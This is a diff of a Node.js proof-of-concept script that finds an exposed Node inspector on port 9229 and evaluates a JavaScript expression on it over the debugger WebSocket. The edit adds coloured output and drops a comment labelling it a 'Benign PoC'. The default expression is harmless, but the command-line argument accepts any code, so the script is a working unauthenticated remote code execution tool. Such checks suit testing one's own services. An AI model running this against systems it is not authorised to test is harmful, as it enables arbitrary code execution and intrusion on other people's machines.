@@ -1,31 +1,34 @@
 #!/usr/bin/env node
-// Benign PoC: Node --inspect (9229) unauthenticated evaluation proof.
 const http = require('http');
 const WebSocket = require('ws');
+
+// ANSI Color Codes
+const RED = '\x1b[31m';
+const GREEN = '\x1b[32m';
+const YELLOW = '\x1b[33m';
+const CYAN = '\x1b[36m';
+const BOLD = '\x1b[1m';
+const RESET = '\x1b[0m';
 
 const host = process.argv[2] || '127.0.0.1:9229';
 const expr = process.argv[3] || "process.pid + ' @ ' + require('os').hostname()";
 
-// 1. Fetch the inspector targets via HTTP GET
 http.get(`http://${host}/json/list`, (res) => {
   let data = '';
 
-  res.on('data', (chunk) => {
-    data += chunk;
-  });
+  res.on('data', (chunk) => { data += chunk; });
 
   res.on('end', () => {
     try {
       const targets = JSON.parse(data);
       if (!targets || targets.length === 0) {
-        console.error('[-] No inspector targets found.');
+        console.error(`${RED}[-] No inspector targets found.${RESET}`);
         process.exit(1);
       }
 
       const wsUrl = targets[0].webSocketDebuggerUrl;
-      console.log('[+] EXPOSED inspector:', wsUrl);
+      console.log(`${BOLD}${YELLOW}[!] EXPOSED INSPECTOR DETECTED:${RESET} ${CYAN}${wsUrl}${RESET}`);
 
-      // 2. Connect to the V8 Inspector via WebSocket
       const ws = new WebSocket(wsUrl);
 
       ws.on('open', () => {
@@ -44,19 +47,24 @@ http.get(`http://${host}/json/list`, (res) => {
       ws.on('message', (message) => {
         const msg = JSON.parse(message.toString());
         if (msg.id === 1) {
-          console.log('[+] Eval:', JSON.stringify(msg.result, null, 2));
+          console.log(`\n${BOLD}${GREEN}[+] EVALUATION OUTPUT:${RESET}`);
+          if (msg.result && msg.result.value) {
+            console.log(`${GREEN}${msg.result.value}${RESET}`);
+          } else {
+            console.log(JSON.stringify(msg.result, null, 2));
+          }
           ws.close();
         }
       });
 
       ws.on('error', (err) => {
-        console.error('[-] WebSocket error:', err.message);
+        console.error(`${RED}[-] WebSocket error: ${err.message}${RESET}`);
       });
 
     } catch (err) {
-      console.error('[-] Failed to parse response:', err.message);
+      console.error(`${RED}[-] Failed to parse HTTP response: ${err.message}${RESET}`);
     }
   });
 }).on('error', (err) => {
-  console.error('[-] Request error:', err.message);
+  console.error(`${RED}[-] Connection error: ${err.message}${RESET}`);
 });
